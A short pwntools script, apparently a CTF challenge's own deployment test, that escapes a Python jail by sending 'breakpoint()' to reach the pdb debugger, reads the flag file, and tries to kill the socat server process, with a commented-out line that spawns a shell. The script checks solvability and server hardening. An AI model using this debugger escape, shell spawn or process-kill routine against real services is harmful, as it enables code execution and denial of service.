from pwn import *

# List process and find the first one with socat
# searching 'socat' on cmdline may have false positive.
cmd = b'''
def find_socat_pid():
    os = __import__('os')
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            cmdline_file = f'/proc/{pid}/cmdline'
            try:
                if 'socat' in open(cmdline_file, 'r').read():
                    return int(pid)
            except Exception:
                continue
    return None
'''

context.throw_eof_on_incomplete_line = True

if __name__ == '__main__':
    r = remote('host.docker.internal', 25038)
    r.sendlineafter(b'> ', b'breakpoint()') # thanks to p3n9uin for this method
    # Try if we can read the text file (i.e. solvable)
    r.sendlineafter(b'(Pdb)', b'import os')
    r.sendlineafter(b'(Pdb)', b'\'cookie_and_cream.txt\' in os.listdir()')
    assert(b'True' == r.recvline(keepends=False).strip())
    with open('deploy/cookie_and_cream.txt', 'rb') as f:
        flag = f.read().strip()
    r.sendlineafter(b'(Pdb)', b'\'' + flag + b'\' in open(\'cookie_and_cream.txt\', \'r\').read()')
    assert(b'True' == r.recvline(keepends=False).strip())
    print("Test passed: Can read flag")
    # Uncomment to spawn shell
    # r.sendlineafter(b'> ', b'breakpoint()\n__import__(\'os\').system(\'sh\')') # thanks to p3n9uin for this command
    # Try killing the server process (i.e. socat)
    r.sendlineafter(b'(Pdb)', b'exec("' + cmd.replace(b'\n', b"\\n") + b'")')
    r.sendlineafter(b'(Pdb)', b'os.kill(find_socat_pid(), 15)') # 15: SIGTERM
    try:
        l = r.recvline()
        assert(b'PermissionError' in l)
    except EOFError:
        print("socat killed successfully. Fix permissions!")
        raise EOFError
    print("All tests passed")
    r.interactive()